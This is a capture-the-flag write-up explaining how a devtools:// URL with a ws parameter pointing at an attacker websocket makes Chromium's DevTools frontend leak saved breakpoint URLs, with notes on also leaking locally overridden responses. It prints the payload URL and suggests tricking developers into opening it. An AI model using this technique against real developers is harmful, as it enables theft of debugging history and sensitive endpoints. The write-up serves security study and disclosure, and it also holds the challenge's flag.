## Title
Goofy Ahh Frontend

## Description
Tip of the day: do not trust strangers on the internet asking you to visit their links

## Solution
As you can see from the given bot source, on initialization step it does set a breakpoint on a certain url which is unknown. Thus key to the solution is finding a way to leak that url.

### Chromium internals
There's a special protocol handler on Chromium that lets you open DevTools UI as a web page and even debug DevTools with DevTools. It can act as a remote debugging frontend, connecting to whatever websocket you want via `ws` GET parameter. Upon successfull connection, it will spit the entire breakpoint list you've ever set in this browser profile with separate `Debugger.setBreakpointByUrl` events. Here's the related code snippet:

```js
async #y(e) {
    const t = await Promise.all(e.map((e => e.url ? this.#I.setBreakpointByURL(e.url, e.lineNumber, e.columnNumber, e.condition) : this.#I.setBreakpointInAnonymousScript(e.scriptHash, e.lineNumber, e.columnNumber, e.condition))))
        , o = [];
    let i = []
        , r = !1;
    for (const e of t)
        e.breakpointId ? (o.push(e.breakpointId),
        i = i.concat(e.locations)) : r = !0;
    return {
        breakpointIds: o,
        locations: i,
        serverError: r
    }
}
```

Entire payload URL: `devtools://devtools/bundled/devtools_app.html?ws=<ip>:<port>` \
(or `inspector.html` instead of the `devtools_app.html`, doesn't matter)

In the real case, if you trick some developer to copypaste it to the browser (or open via hyperlink in another app), it will immediately leak the entire breakpoint history (which may include URL's to some sensitive hidden hosts and local file paths).

### Why `set_breakpoint`'s implementation is hidden in the given bot source?
There's no convenient API for setting persistent breakpoints: `chromedriver` has no such functionality, while CDP methods produce a different type of breakpoints which last for the current debugging session only. Because of that, I've came up with a crutch. Normally, persistent breakpoints that you put in the DevTools are being saved to the Local Storage field called `breakpoints` under the `devtools://devtools` origin. I've did exactly that, but this little mention could spoil the entire solution, so implementation was hidden. 

Actually, you don't really need to run the bot code as all it does is just visiting the provided links with no logic in the middle. You can test all this in your browser.

### PS
Although this is not related to the task, there's also a `Fetch.enable` event that will leak locally overriden responses (URL's to original endpoints) through the `patterns` parameter. You may then try to leak the saved overriden bodies with the fake `Fetch.requestPaused` event for the URL's leaked through `patterns`. It may contain sensitive information from the websites that had been debugged previously. Check out the [websocket hook code](./writeup/ws_server.py) for an example.

### Is this a security issue?
The first concern is whether it is intended for this interface to be opened by an URL at all. To strengthen our doubt, lets check what happens if we try to use it as a remote debugging frontend for a regular browser session with debug enabled. It will not work! Why?
- When we open the debugger through chrome://inspect, it opens in a dedicated window and sends no `Origin` header on the websocket handshake, thus working fine
- When we open the debugger using above mentioned URL, our browser adds an `Origin` header with `devtools://devtools` value, which causes a 403 response from the remote browser with the following error:
```
Rejected an incoming WebSocket connection from the devtools://devtools origin. Use the command line flag --remote-allow-origins=devtools://devtools to allow connections from this origin or --remote-allow-origins=* to allow all origins.
```
Interesting. It still can be tuned with an extra launch option, but for that case it's quite ambigious since it normally opens in a context where `Origin` header is not being sent at all.

Either way that's a minor concern, so probably it's not really an issue. But I think chromium maintainers should add some prompting alert to ask whether you know what you are doing before leaking all this stuff to an untrusted websocket.

## Flag
SAS{n1c3_t0_m33t_y0u_bu7_h0w_you_f0und_m3?}

**Solved by:** 2 teams